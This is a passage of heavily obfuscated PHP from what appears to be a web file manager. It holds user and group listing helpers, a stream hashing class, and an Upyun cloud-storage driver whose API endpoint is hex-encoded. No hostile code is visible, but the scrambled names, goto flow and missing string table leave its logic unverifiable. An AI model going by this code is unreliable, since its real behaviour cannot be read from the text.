$aˆäôƒÏËë = $this->_searchFromMeta($e†‘®È“”®[444], $aæƒ‹¥ÅŸ, 10); $CºÚ‡É„„Å = array_merge($dœëÊ¨÷´¹, $aˆäôƒÏËë, $DŠ”ËªĞ´‘[$e†‘®È“”®[367]]); $DŠ”ËªĞ´‘[$e†‘®È“”®[367]] = array_unique_by_key($CºÚ‡É„„Å, $e†‘®È“”®[1517]); $DŠ”ËªĞ´‘[$e†‘®È“”®[364]][$e†‘®È“”®[365]] = count($DŠ”ËªĞ´‘[$e†‘®È“”®[367]]); $DŠ”ËªĞ´‘[$e†‘®È“”®[364]][$e†‘®È“”®[366]] = ceil($DŠ”ËªĞ´‘[$e†‘®È“”®[364]][$e†‘®È“”®[365]] / $DŠ”ËªĞ´‘[$e†‘®È“”®[364]][$e†‘®È“”®[361]]); } $this->_listDataApply($DŠ”ËªĞ´‘[$e†‘®È“”®[367]]); goto aÖ»ã‘ËÃ¾; Eœ­Œƒˆ–¿: $aæƒ‹¥ÅŸ = str_replace($e†‘®È“”®[1766], $e†‘®È“”®[1767], trim($aæƒ‹¥ÅŸ)); $b—Œí‡÷œÉ = array($e†‘®È“”®[28] => array($e†‘®È“”®[380], "\45{$aæƒ‹¥ÅŸ}\x25"), $e†‘®È“”®[303] => array($e†‘®È“”®[380], "{$aæƒ‹¥ÅŸ}\45"), $e†‘®È“”®[1945] => array($e†‘®È“”®[380], "{$aæƒ‹¥ÅŸ}\x25"), $e†‘®È“”®[948] => $e†‘®È“”®[1768]); if (Input::check($aæƒ‹¥ÅŸ, $e†‘®È“”®[309])) { $b—Œí‡÷œÉ[$e†‘®È“”®[1517]] = array($e†‘®È“”®[380], "{$aæƒ‹¥ÅŸ}\x25"); $b—Œí‡÷œÉ[$e†‘®È“”®[2126]] = array($e†‘®È“”®[380], "{$aæƒ‹¥ÅŸ}\45"); } goto E¬ßÁŸ‹“³; A˜¯óøéÇ: $e†‘®È“”® =& $_SERVER[ÒÆ›ÆØÎ¾]; $aæƒ‹¥ÅŸ = $dÚÅ÷…‚¾„[$e†‘®È“”®[1764]]; $aá¡’çÕæÂ = isset($dÚÅ÷…‚¾„[$e†‘®È“”®[1765]]) ? $dÚÅ÷…‚¾„[$e†‘®È“”®[1765]] : !1; goto Eœ­Œƒˆ–¿; aÖ»ã‘ËÃ¾: $this->_filterByGroup($DŠ”ËªĞ´‘, $aá¡’çÕæÂ); return $DŠ”ËªĞ´‘; goto aÍ÷çáÊø‘; E¬ßÁŸ‹“³: if (!$aæƒ‹¥ÅŸ) { $b—Œí‡÷œÉ = array(); } if (isset($dÚÅ÷…‚¾„[$e†‘®È“”®[702]])) { $b—Œí‡÷œÉ[$e†‘®È“”®[702]] = $dÚÅ÷…‚¾„[$e†‘®È“”®[702]]; } $b—Œí‡÷œÉ = $this->parseWhereLike($b—Œí‡÷œÉ); goto dòŸŞ¢Úµµ; aÍ÷çáÊø‘: } private function _filterByGroup(&$CÏ©¤ïÁ†¯, $Fùå…ç·Û·) { $dª­Èç„‹Ô =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$Fùå…ç·Û·) { return $CÏ©¤ïÁ†¯; } foreach ($CÏ©¤ïÁ†¯[$dª­Èç„‹Ô[367]] as $eñˆËõØ´ => &$aä•ƒ‚‰Ò) { $F¬¯´é¤»‹ = array_to_keyvalue($aä•ƒ‚‰Ò[$dª­Èç„‹Ô[1855]], $dª­Èç„‹Ô[33], $dª­Èç„‹Ô[1681]); if (!in_array($Fùå…ç·Û·, $F¬¯´é¤»‹)) { unset($CÏ©¤ïÁ†¯[$dª­Èç„‹Ô[367]][$eñˆËõØ´]); } } unset($aä•ƒ‚‰Ò); $CÏ©¤ïÁ†¯[$dª­Èç„‹Ô[367]] = array_values($CÏ©¤ïÁ†¯[$dª­Èç„‹Ô[367]]); $CÏ©¤ïÁ†¯[$dª­Èç„‹Ô[364]] = array($dª­Èç„‹Ô[1917] => count($CÏ©¤ïÁ†¯[$dª­Èç„‹Ô[367]]), $dª­Èç„‹Ô[1915] => $CÏ©¤ïÁ†¯[$dª­Èç„‹Ô[364]][$dª­Èç„‹Ô[361]], $dª­Èç„‹Ô[1914] => 1, $dª­Èç„‹Ô[1916] => 1); } private function _searchFromMeta($Eó¢Ô™°ƒ, $fË“—«ï´™, $Aø¬½À¡î¼) { goto f—ìˆò²¬å; d¥»÷ˆİ®¿: $Cöç”Œ±©Ù = $this->parseWhereLike($Cöç”Œ±©Ù); $aÒ¤‰ëÍ‰ê = Model($E…¶‰»õ˜[2146])->where($Cöç”Œ±©Ù)->limit($Aø¬½À¡î¼)->select(); if (!$aÒ¤‰ëÍ‰ê) { return array(); } goto F…¹´öˆÓ˜; cçñ±¡ä: return $b¦¹…íòš×; goto B³ÀäöÛ»; F…¹´öˆÓ˜: $aÒ¤‰ëÍ‰ê = array_to_keyvalue($aÒ¤‰ëÍ‰ê, $E…¶‰»õ˜[33], $E…¶‰»õ˜[1517]); $b¦¹…íòš× = $this->where(array($E…¶‰»õ˜[1509] => array($E…¶‰»õ˜[7], $aÒ¤‰ëÍ‰ê)))->select(); if (!$b¦¹…íòš×) { return array(); } goto cçñ±¡ä; f—ìˆò²¬å: $E…¶‰»õ˜ =& $_SERVER[ÒÆ›ÆØÎ¾]; $fË“—«ï´™ = strtolower($fË“—«ï´™); $Cöç”Œ±©Ù = array($E…¶‰»õ˜[93] => $Eó¢Ô™°ƒ, $E…¶‰»õ˜[372] => array($E…¶‰»õ˜[380], "\x25{$fË“—«ï´™}\x25")); goto d¥»÷ˆİ®¿; B³ÀäöÛ»: } private function _listDataApplyItem($DÔ¦—–ˆÀÉ) { $fÕÄÄõÓ–‚ = array($DÔ¦—–ˆÀÉ); $this->_listDataApply($fÕÄÄõÓ–‚); return $fÕÄÄõÓ–‚[0]; } private function _listDataApply(&$cÎ ÖóØºâ) { goto C »‰Œİ©; FÏ‚÷‚Ğå: $Cë¨†Êâ¦‰ = array_to_keyvalue($cÎ ÖóØºâ, $aìÈêññÍ[33], $aìÈêññÍ[1517]); $this->_listAppendGroup($cÎ ÖóØºâ, $Cë¨†Êâ¦‰); $this->_listAppendMeta($cÎ ÖóØºâ, $Cë¨†Êâ¦‰); goto EêÎšêÇ†; C »‰Œİ©: $aìÈêññÍ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$cÎ ÖóØºâ) { return; } array_remove_key($cÎ ÖóØºâ, $aìÈêññÍ[840]); goto FÏ‚÷‚Ğå; EêÎšêÇ†: $this->_listAppendSourceRoot($cÎ ÖóØºâ, $Cë¨†Êâ¦‰); goto dëÀç†Í²õ; dëÀç†Í²õ: } private function _listAppendSourceRoot(&$EóôÍºÜÎÅ, $c†™Ñëåô) { goto C¦ñ²æÅŸ; bß­™ã´µÎ: $eÁ“µ›¿Æ” = Model($AÜÆõİ¸¥”[782])->order($AÜÆõİ¸¥”[1775])->field($c§âØ‰º‹ñ)->where($Aç©«Çï¶)->select(); $eÁ“µ›¿Æ” = array_to_keyvalue($eÁ“µ›¿Æ”, $AÜÆõİ¸¥”[484]); $eÁ“µ›¿Æ” = array_remove_key($eÁ“µ›¿Æ”, $AÜÆõİ¸¥”[484]); goto D‰—ÅÌ³; C¦ñ²æÅŸ: $AÜÆõİ¸¥” =& $_SERVER[ÒÆ›ÆØÎ¾]; $Aç©«Çï¶ = array($AÜÆõİ¸¥”[478] => 0, $AÜÆõİ¸¥”[404] => SourceModel::TYPE_USER, $AÜÆõİ¸¥”[484] => array($AÜÆõİ¸¥”[7], $c†™Ñëåô)); $c§âØ‰º‹ñ = $AÜÆõİ¸¥”[1774]; goto bß­™ã´µÎ; D‰—ÅÌ³: foreach ($EóôÍºÜÎÅ as &$d¡ÌƒÅËâ) { $d¡ÌƒÅËâ[$AÜÆõİ¸¥”[85]] = $eÁ“µ›¿Æ”[$d¡ÌƒÅËâ[$AÜÆõİ¸¥”[1517]]] ? $eÁ“µ›¿Æ”[$d¡ÌƒÅËâ[$AÜÆõİ¸¥”[1517]]] : array(); } unset($d¡ÌƒÅËâ); goto Fïà”ÆĞÑÁ; Fïà”ÆĞÑÁ: } private function _listAppendGroup(&$CƒÑÓ½, $E´ÙœâÍÑ) { goto cÉÕƒ²ãÚÚ; bæÄèˆÆÇŞ: $BÎèêÛÆ£ = array_to_keyvalue($cé˜óîùª, $F°ù«›—³¸[33], $F°ù«›—³¸[1681]); $BÎèêÛÆ£ = array_remove_value(array_unique($BÎèêÛÆ£), $F°ù«›—³¸[191]); if (!$BÎèêÛÆ£ || !$cé˜óîùª) { return; } goto Bæ¨½÷Í‘ô; cÉÕƒ²ãÚÚ: $F°ù«›—³¸ =& $_SERVER[ÒÆ›ÆØÎ¾]; $fÀ›±ÏÑå„ = array($F°ù«›—³¸[1517] => array($F°ù«›—³¸[7], $E´ÙœâÍÑ)); $cé˜óîùª = Model($F°ù«›—³¸[1762])->where($fÀ›±ÏÑå„)->select(); goto bæÄèˆÆÇŞ; Bæ¨½÷Í‘ô: $fÀ›±ÏÑå„ = array($F°ù«›—³¸[1681] => array($F°ù«›—³¸[7], $BÎèêÛÆ£)); $AŒùÒùÕœˆ = Model($F°ù«›—³¸[1853])->field($F°ù«›—³¸[2147])->where($fÀ›±ÏÑå„)->select(); $AŒùÒùÕœˆ = array_to_keyvalue($AŒùÒùÕœˆ, $F°ù«›—³¸[1681]); goto e³æ¢³Èµƒ; A˜»¯‚: foreach ($CƒÑÓ½ as &$B¤ø„ªæÖ›) { $B¤ø„ªæÖ›[$F°ù«›—³¸[1855]] = array(); if (isset($cé˜óîùª[$B¤ø„ªæÖ›[$F°ù«›—³¸[1517]]])) { $B¤ø„ªæÖ›[$F°ù«›—³¸[1855]] = $cé˜óîùª[$B¤ø„ªæÖ›[$F°ù«›—³¸[1517]]]; } } unset($B¤ø„ªæÖ›); goto CÄÊÓæİÊ•; e³æ¢³Èµƒ: $cé˜óîùª = array_to_keyvalue_group($cé˜óîùª, $F°ù«›—³¸[1517]); foreach ($cé˜óîùª as &$eªîñö–Ò°) { $A´ß‰‘ìÓî = array(); foreach ($eªîñö–Ò° as $AƒÙ‰æ¨¸›) { if (!$AƒÙ‰æ¨¸›[$F°ù«›—³¸[1776]]) { continue; } $b…óî‚áÆÒ = Model($F°ù«›—³¸[1848])->listData($AƒÙ‰æ¨¸›[$F°ù«›—³¸[1776]]); $A´ß‰‘ìÓî[] = array($F°ù«›—³¸[1681] => $AƒÙ‰æ¨¸›[$F°ù«›—³¸[1681]], $F°ù«›—³¸[2148] => $AŒùÒùÕœˆ[$AƒÙ‰æ¨¸›[$F°ù«›—³¸[1681]]][$F°ù«›—³¸[28]], $F°ù«›—³¸[487] => $AŒùÒùÕœˆ[$AƒÙ‰æ¨¸›[$F°ù«›—³¸[1681]]][$F°ù«›—³¸[487]], $F°ù«›—³¸[406] => $b…óî‚áÆÒ); } $eªîñö–Ò° = $A´ß‰‘ìÓî; } unset($eªîñö–Ò°); goto A˜»¯‚; CÄÊÓæİÊ•: } private function _listAppendMeta(&$bÖêˆ‡İ¿¡, $côî³¬™äæ) { goto càôéÛíÆª; C‰½õ¾ÈÒ: foreach ($A†§œË‚± as &$Eß…ùàÇª) { $A˜ô¹İøÃÒ = array(); foreach ($Eß…ùàÇª as $cù‹ñÜŠ®…) { if (!in_array($cù‹ñÜŠ®…[$aÀæåÀ¿¨[93]], $fãÆñ¨íì´)) { $A˜ô¹İøÃÒ[$cù‹ñÜŠ®…[$aÀæåÀ¿¨[93]]] = $cù‹ñÜŠ®…[$aÀæåÀ¿¨[372]]; } } $Eß…ùàÇª = $A˜ô¹İøÃÒ; } unset($Eß…ùàÇª); $d¥˜Å¦ã¸ì = Model($aÀæåÀ¿¨[2149]); goto fÉÄÂÛŞÂÄ; càôéÛíÆª: $aÀæåÀ¿¨ =& $_SERVER[ÒÆ›ÆØÎ¾]; $BÈîâ¶® = UserJobModel::JOB_KEY; $fãÆñ¨íì´ = array($aÀæåÀ¿¨[2127]); goto b‰ôˆïƒ»; fÉÄÂÛŞÂÄ: foreach ($bÖêˆ‡İ¿¡ as &$bĞŞÅ¡’Éœ) { $cğƒø“ = array(); if (isset($A†§œË‚±[$bĞŞÅ¡’Éœ[$aÀæåÀ¿¨[1517]]])) { $cğƒø“ = $A†§œË‚±[$bĞŞÅ¡’Éœ[$aÀæåÀ¿¨[1517]]]; } $bĞŞÅ¡’Éœ[$aÀæåÀ¿¨[2150]] = array(); if (isset($cğƒø“[$BÈîâ¶®])) { $bĞŞÅ¡’Éœ[$aÀæåÀ¿¨[2150]] = $d¥˜Å¦ã¸ì->getUserJobInfo($cğƒø“[$BÈîâ¶®]); } } unset($bĞŞÅ¡’Éœ); goto eê¨³çÌ³½; b‰ôˆïƒ»: $dåàíÊˆ¹ = array($aÀæåÀ¿¨[1517] => array($aÀæåÀ¿¨[7], $côî³¬™äæ)); $A†§œË‚± = Model($aÀæåÀ¿¨[2125])->where($dåàíÊˆ¹)->select(); $A†§œË‚± = array_to_keyvalue_group($A†§œË‚±, $aÀæåÀ¿¨[1517]); goto C‰½õ¾ÈÒ; eê¨³çÌ³½: } protected function groupUserAll($Dã‡â‹ĞÖ¨) { $AñëÄƒ¾Ú° =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$Dã‡â‹ĞÖ¨) { return !1; } $déÃ—µ¼Šˆ = Model($AñëÄƒ¾Ú°[1762])->field($AñëÄƒ¾Ú°[1517])->where(array($AñëÄƒ¾Ú°[1681] => array($AñëÄƒ¾Ú°[7], $Dã‡â‹ĞÖ¨)))->select(); $déÃ—µ¼Šˆ = array_to_keyvalue($déÃ—µ¼Šˆ, $AñëÄƒ¾Ú°[33], $AñëÄƒ¾Ú°[1517]); return array_unique($déÃ—µ¼Šˆ); } public function userSearch($cİÓ§®Ñœ, $DÈ¬°õ÷ñ« = "\52") { return Model($_SERVER[ÒÆ›ÆØÎ¾][506])->where($cİÓ§®Ñœ)->field($DÈ¬°õ÷ñ«)->find(); } } goto FØ„ôÛÂ¹¦; eÌàæÉÙ Ï: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($dí³°‚œ, $d¼î×Ë•‰ = 0) { parent::__construct(); $this->source = $dí³°‚œ; $this->sourceSize = $d¼î×Ë•‰; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($e¹˜ª‚×™Ï = false) { return $this->sourceSize; } public function getContent($f…Ç‹÷Â¬‚ = false) { return $this->fileSubstr($f…Ç‹÷Â¬‚, 0, $this->sourceSize); } public function fileSubstr($aÇ¿Ì‡Èì = false, $bÙ’›îîİ¥ = 0, $CÀº¢Ÿæô = 0) { if (!$CÀº¢Ÿæô) { $CÀº¢Ÿæô = $this->sourceSize; } $EÕ÷ÍÎ™èâ = $this->sourceSize - $bÙ’›îîİ¥; if ($CÀº¢Ÿæô >= $EÕ÷ÍÎ™èâ) { $CÀº¢Ÿæô = $EÕ÷ÍÎ™èâ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $bÙ’›îîİ¥, $CÀº¢Ÿæô); } if ($this->sourceType == self::TYPE_FILE) { if ($CÀº¢Ÿæô <= 0) { return $_SERVER[ÒÆ›ÆØÎ¾][33]; } $e…©ŠËï©¡ = ftell($this->source); fseek_64($this->source, $e…©ŠËï©¡ + $bÙ’›îîİ¥); $eÅñ¯¡„£œ = @fread($this->source, $CÀº¢Ÿæô); fseek_64($this->source, $e…©ŠËï©¡); return $eÅñ¯¡„£œ; } } public function hashMd5($Eì–•·¹ó = false) { return md5($this->getContent()); } public static function hash($Aİ·ŞÙ¡äß, $dîŸÀ¹šÄ = 0) { $Bƒİˆï†¬ = new PathDriverStream($Aİ·ŞÙ¡äß, $dîŸÀ¹šÄ); return $Bƒİˆï†¬->hashSimple($Aİ·ŞÙ¡äß); } public static function md5($FØ¹ØËÔÓ², $eš«Á½ÀÃç = 0) { $fÛ§åÍÍƒ = new PathDriverStream($FØ¹ØËÔÓ², $eš«Á½ÀÃç); return $fÛ§åÍÍƒ->hashMd5($FØ¹ØËÔÓ²); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\x74\x70\x3a\x2f\x2f\166\x30\56\141\x70\x69\56\x75\160\x79\x75\156\56\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($eÒ•†ƒ‰„¦) { parent::__construct(); $this->_init($eÒ•†ƒ‰„¦); } public function _init($EäãªĞ¯é) { $EØçĞ›ò =& $_SERVER[ÒÆ›ÆØÎ¾]; foreach ($EäãªĞ¯é as $e Êšé‡© => $fˆçéÊã¦‹) { if (isset($this->{$e Êšé‡©})) { $this->{$e Êšé‡©} = $fˆçéÊã¦‹; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($EØçĞ›ò[1321] . LNG($EØçĞ›ò[1253])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($AĞÜíÏ ¾­, $Bâ°âàÈëÁ = "\x47\x45\124") { $FÜ„×ÙÓêĞ =& $_SERVER[ÒÆ›ÆØÎ¾]; $b•ÅÄ‹Àğ = gmdate($FÜ„×ÙÓêĞ[1287]); $fâ’Ïœá¬ì = base64_encode(hash_hmac($FÜ„×ÙÓêĞ[1322], "{$Bâ°âàÈëÁ}\x26{$AĞÜíÏ ¾­}\x26{$b•ÅÄ‹Àğ}", md5("{$this->userpass}"), !0)); $bó¥ŠŒ‰Ş = array("\101\165\x74\x68\x6f\x72\x69\172\x61\164\151\157\x6e\72\125\120\131\x55\116\x20{$this->username}\72{$fâ’Ïœá¬ì}", "\x44\x61\x74\x65\72{$b•ÅÄ‹Àğ}"); return $bó¥ŠŒ‰Ş; } public function ussRequest($c‹´ç²Ä¿¤, $DÇñÑÏÈ· = "\x47\x45\124", $B¦ôÒÈ® = false, $A«¼ô„ÚÂ› = false, $fç©ŞÊá©¢ = false) { goto D…¶¸¥•¹š; A ’ÒÎ¦Ü: if (!$fÖŞœ±š¯) { return array($E÷ß‹Şçõ[1077] => !1, $E÷ß‹Şçõ[1079] => $E÷ß‹Şçõ[1323]); } if (strtolower($DÇñÑÏÈ·) == $E÷ß‹Şçõ[190] || in_array($fÖŞœ±š¯[$E÷ß‹Şçõ[1077]], array($E÷ß‹Şçõ[1180], $E÷ß‹Şçõ[1324]))) { $B¦ôÒÈ® = $fÖŞœ±š¯[$E÷ß‹Şçõ[1325]]; } else { $B¦ôÒÈ® = json_decode($fÖŞœ±š¯[$E÷ß‹Şçõ[1079]], !0); if (!$B¦ôÒÈ®) { $B¦ôÒÈ® = $fÖŞœ±š¯[$E÷ß‹Şçõ[1079]]; } else { if (!$fÖŞœ±š¯[$E÷ß‹Şçõ[702]] && isset($B¦ôÒÈ®[$E÷ß‹Şçõ[1326]])) { $B¦ôÒÈ® = $B¦ôÒÈ®[$E÷ß‹Şçõ[1326]]; } } } return array($E÷ß‹Şçõ[1077] => $fÖŞœ±š¯[$E÷ß‹Şçõ[702]], $E÷ß‹Şçõ[1079] => $B¦ôÒÈ®); goto BİËóŸå¦÷; dÌˆµŸö: $eºÎî¢Æ˜ = $this->ussHeaders($c ËÏ–õ½Ğ, $DÇñÑÏÈ·); if ($A«¼ô„ÚÂ›) { $eºÎî¢Æ˜ = array_merge($eºÎî¢Æ˜, $A«¼ô„ÚÂ›); } $fÖŞœ±š¯ = url_request($this->endpoint . $c ËÏ–õ½Ğ, $DÇñÑÏÈ·, $B¦ôÒÈ®, $eºÎî¢Æ˜, $fç©ŞÊá©¢); goto A ’ÒÎ¦Ü; D…¶¸¥•¹š: $E÷ß‹Şçõ =& $_SERVER[ÒÆ›ÆØÎ¾]; $c‹´ç²Ä¿¤ = trim($c‹´ç²Ä¿¤, $E÷ß‹Şçõ[8]); $c ËÏ–õ½Ğ = "\x2f{$this->bucket}\57{$c‹´ç²Ä¿¤}"; goto dÌˆµŸö; BİËóŸå¦÷: } public function mkfile($BÒÁµÆ½˜÷, $CÖÑ‡´³’¹ = '', $FĞ¨¹ñå‘º = REPEAT_RENAME) { if ($this->setContent($BÒÁµÆ½˜÷, $CÖÑ‡´³’¹)) { return $this->getPathOuter($BÒÁµÆ½˜÷); } return !1; } public function mkdir($cÒ‹ºª‚‡Ø, $FèôÚÊíÄŸ = REPEAT_SKIP) { $dóŸ»ÕÍ´¨ =& $_SERVER[ÒÆ›ÆØÎ¾]; $B´Ú……‰•± = trim($cÒ‹ºª‚‡Ø, $dóŸ»ÕÍ´¨[8]); if ($this->_isFolder($B´Ú……‰•±)) { return $this->getPathOuter($B´Ú……‰•±); } $d¼¹ƒ™Š“¤ = array($dóŸ»ÕÍ´¨[1327]); $d¶òÒ‡˜î = $this->ussRequest($B´Ú……‰•±, $dóŸ»ÕÍ´¨[224], !1, $d¼¹ƒ™Š“¤); return $d¶òÒ‡˜î[$dóŸ»ÕÍ´¨[1077]] ? $this->getPathOuter($B´Ú……‰•±) : !1; } public function copyFile($FãÌ’Ø§ñ, $DÜ•ÀîŞæ) { $bç­ãà·Ö =& $_SERVER[ÒÆ›ÆØÎ¾]; $eŒÄ©ğ£èí = array($bç­ãà·Ö[1328] . "\x2f{$this->bucket}\57{$FãÌ’Ø§ñ}", $bç­ãà·Ö[1329]); $cùÎÕ„ˆ’ = $this->ussRequest($DÜ•ÀîŞæ, $bç­ãà·Ö[226], !1, $eŒÄ©ğ£èí); return $cùÎÕ„ˆ’[$bç­ãà·Ö[1077]] ? !0 : $this->getPathOuter($DÜ•ÀîŞæ); } public function moveFile($E„š±œ¯, $F­ÙĞ²ù£’) { $c¾ÌôôöÈÓ =& $_SERVER[ÒÆ›ÆØÎ¾]; $e´ËéÁë› = array($c¾ÌôôöÈÓ[1330] . "\57{$this->bucket}\x2f{$E„š±œ¯}", $c¾ÌôôöÈÓ[1329]); $b•›¿è¢ëÕ = $this->ussRequest($F­ÙĞ²ù£’, $c¾ÌôôöÈÓ[226], !1, $e´ËéÁë›); return $b•›¿è¢ëÕ[$c¾ÌôôöÈÓ[1077]] ? !0 : $this->getPathOuter($F­ÙĞ²ù£’); } public function delFile($D×ñÈ£†…†) { $Dß…ØâŸó =& $_SERVER[ÒÆ›ÆØÎ¾]; $Dœ‚º…´ŸŞ = $this->ussRequest($D×ñÈ£†…†, $Dß…ØâŸó[1331]); return $Dœ‚º…´ŸŞ[$Dß…ØâŸó[1077]] ? !0 : !1; } public function delFolder($a£½Î”‰ƒ) { goto fÓÛî¬æÎÊ; c‡à¥†ò¯›: $C§¤Ìï‰­İ = $f‚„Ï¤· = array(); $this->fileList($a£½Î”‰ƒ, $C§¤Ìï‰­İ, $f‚„Ï¤·, !0); $this->listItemCache = !0; goto bÇá•­ê¶; bÇá•­ê¶: foreach ($f‚„Ï¤· as $D¶µóßâ§·) { $a©ª¯‚ËÆÏ = $this->ussRequest($D¶µóßâ§·[$DöÚÛ‘´‹İ[28]], $DöÚÛ‘´‹İ[1331]); if (!$a©ª¯‚ËÆÏ[$DöÚÛ‘´‹İ[1077]]) { return !1; } } foreach ($C§¤Ìï‰­İ as $D´í¿¨¥«‡) { $a©ª¯‚ËÆÏ = $this->ussRequest($D´í¿¨¥«‡, $DöÚÛ‘´‹İ[1331]); if (!$a©ª¯‚ËÆÏ[$DöÚÛ‘´‹İ[1077]]) { return !1; } } $a©ª¯‚ËÆÏ = $this->ussRequest($a£½Î”‰ƒ, $DöÚÛ‘´‹İ[1331]); goto a‹„š ¿ãĞ; fÓÛî¬æÎÊ: $DöÚÛ‘´‹İ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$this->exist($a£½Î”‰ƒ)) { return !0; } $this->listItemCache = !1; goto c‡à¥†ò¯›; a‹„š ¿ãĞ: return $a©ª¯‚ËÆÏ[$DöÚÛ‘´‹İ[1077]]; goto d®°ò„Šíœ; d®°ò„Šíœ: } public function rename($DƒÙÖ¯óÛó, $BéçœÒ±•ö) { if ($this->isFile($DƒÙÖ¯óÛó)) { $BéçœÒ±•ö = get_path_father($DƒÙÖ¯óÛó) . $BéçœÒ±•ö; return $this->moveFile($DƒÙÖ¯óÛó, $BéçœÒ±•ö); } return $this->renameObject($DƒÙÖ¯óÛó, $BéçœÒ±•ö); } public function fileInfo($aé§——Û…Í, $eÇ¡é–ò¡­ = false, $fÒÇ³øç£¨ = array()) { goto FİÓ°Îë¿Ä; dÏŒøöìÂ: return $fõÑÒ°ÛÂŒ; goto D¡¨µÚ¶ª¸; FİÓ°Îë¿Ä: $cø™ß½• =& $_SERVER[ÒÆ›ÆØÎ¾]; $fõÑÒ°ÛÂŒ = array($cø™ß½•[28] => $this->pathThis($aé§——Û…Í), $cø™ß½•[76] => $this->getPathOuter($cø™ß½•[8] . $aé§——Û…Í), $cø™ß½•[29] => $cø™ß½•[193], $cø™ß½•[78] => isset($fÒÇ³øç£¨[$cø™ß½•[78]]) ? $fÒÇ³øç£¨[$cø™ß½•[78]] : 0, $cø™ß½•[168] => $this->ext($aé§——Û…Í)); if ($eÇ¡é–ò¡­) { return $fõÑÒ°ÛÂŒ; } goto B©Ïã¸Œ„; fÜó¸¢„µ: $fõÑÒ°ÛÂŒ[$cø™ß½•[194]] = intval($fÒÇ³øç£¨[$cø™ß½•[1332]]); $fõÑÒ°ÛÂŒ[$cø™ß½•[84]] = intval($fÒÇ³øç£¨[$cø™ß½•[1333]]); $fõÑÒ°ÛÂŒ[$cø™ß½•[78]] = $fÒÇ³øç£¨[$cø™ß½•[78]]; goto dÏŒøöìÂ; B©Ïã¸Œ„: $fõÑÒ°ÛÂŒ[$cø™ß½•[194]] = $fõÑÒ°ÛÂŒ[$cø™ß½•[84]] = 0; $fõÑÒ°ÛÂŒ[$cø™ß½•[195]] = $fõÑÒ°ÛÂŒ[$cø™ß½•[196]] = !0; if (empty($fÒÇ³øç£¨)) { $fÒÇ³øç£¨ = $this->objectMeta($aé§——Û…Í); if (!$fÒÇ³øç£¨) { return $fõÑÒ°ÛÂŒ; } } goto fÜó¸¢„µ; D¡¨µÚ¶ª¸: } public function folderInfo($F”²åªˆà·, $bõëÏŒ…¡´ = false) { goto F®ŸÛ•–ğ; F®ŸÛ•–ğ: $eœÑÂÏÊ—¿ =& $_SERVER[ÒÆ›ÆØÎ¾]; $FÙá¬àÁ˜ = array($eœÑÂÏÊ—¿[28] => $this->pathThis($F”²åªˆà·), $eœÑÂÏÊ—¿[76] => $this->getPathOuter($eœÑÂÏÊ—¿[8] . $F”²åªˆà·), $eœÑÂÏÊ—¿[29] => $eœÑÂÏÊ—¿[77]); if ($bõëÏŒ…¡´) { return $FÙá¬àÁ˜; } goto f•‡Š¿‰Ğ‰; f•‡Š¿‰Ğ‰: $FÙá¬àÁ˜[$eœÑÂÏÊ—¿[194]] = $FÙá¬àÁ˜[$eœÑÂÏÊ—¿[84]] = 0; $FÙá¬àÁ˜[$eœÑÂÏÊ—¿[195]] = $FÙá¬àÁ˜[$eœÑÂÏÊ—¿[196]] = !0; if (empty($eøä–Ğ²•)) { $eøä–Ğ²• = $this->objectMeta($F”²åªˆà·); if (!$eøä–Ğ²•) { return $FÙá¬àÁ˜; } } goto EÓ¼²»ùĞá; EÓ¼²»ùĞá: $FÙá¬àÁ˜[$eœÑÂÏÊ—¿[194]] = intval($eøä–Ğ²•[$eœÑÂÏÊ—¿[1332]]); $FÙá¬àÁ˜[$eœÑÂÏÊ—¿[84]] = intval($eøä–Ğ²•[$eœÑÂÏÊ—¿[1333]]); return $FÙá¬àÁ˜; goto F©é¨“¤à; F©é¨“¤à: } private function listObjs($aÕÖÍÏÕ„¬, $fïˆÏ‡¡“ = 0, $F’çôÈâ£ = 1000) { $bäÜ®İçŠ =& $_SERVER[ÒÆ›ÆØÎ¾]; $CóŸÕÀ¦ = array($bäÜ®İçŠ[1334], $bäÜ®İçŠ[1335] . $F’çôÈâ£); if ($fïˆÏ‡¡“) { $CóŸÕÀ¦[] = $bäÜ®İçŠ[1336] . $fïˆÏ‡¡“; } $BÊ¼»¿¸É = $this->ussRequest($aÕÖÍÏÕ„¬, $bäÜ®İçŠ[228], !1, $CóŸÕÀ¦); return !$BÊ¼»¿¸É[$bäÜ®İçŠ[1077]] ? !1 : $BÊ¼»¿¸É[$bäÜ®İçŠ[1079]]; } private function fileList($Bì˜‹Æï, &$dãàêŠ¿ºœ, &$b°î«­™, $D±¹¥î†¿¯ = false) { goto F°‡¨ù®‰É; eäÁºí–‚: $Bµ‰Ã—Ë» = rtrim($Bì˜‹Æï, $f‡‰¾À¯†â[8]) . $f‡‰¾À¯†â[8]; $CçêÜñ‹è = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $b‘ÂƒÄæî = $this->listObjs($Bì˜‹Æï, $bÔÚÀÖ²­è, $Dñœ‰Èš˜¬); if (!$b‘ÂƒÄæî) { return !1; } $bÔÚÀÖ²­è = isset($b‘ÂƒÄæî[$f‡‰¾À¯†â[1337]]) ? $b‘ÂƒÄæî[$f‡‰¾À¯†â[1337]] : $f‡‰¾À¯†â[33]; $D¼ã¦‹ô = isset($b‘ÂƒÄæî[$f‡‰¾À¯†â[1338]]) ? $b‘ÂƒÄæî[$f‡‰¾À¯†â[1338]] : array(); foreach ($D¼ã¦‹ô as $cÇéø„ŞÌ¼) { $C²ÉñÛ‹Ÿ = $cÇéø„ŞÌ¼[$f‡‰¾À¯†â[29]] == $f‡‰¾À¯†â[77] ? !0 : !1; $B’ÍÌÅÆÃø = ltrim($Bµ‰Ã—Ë» . 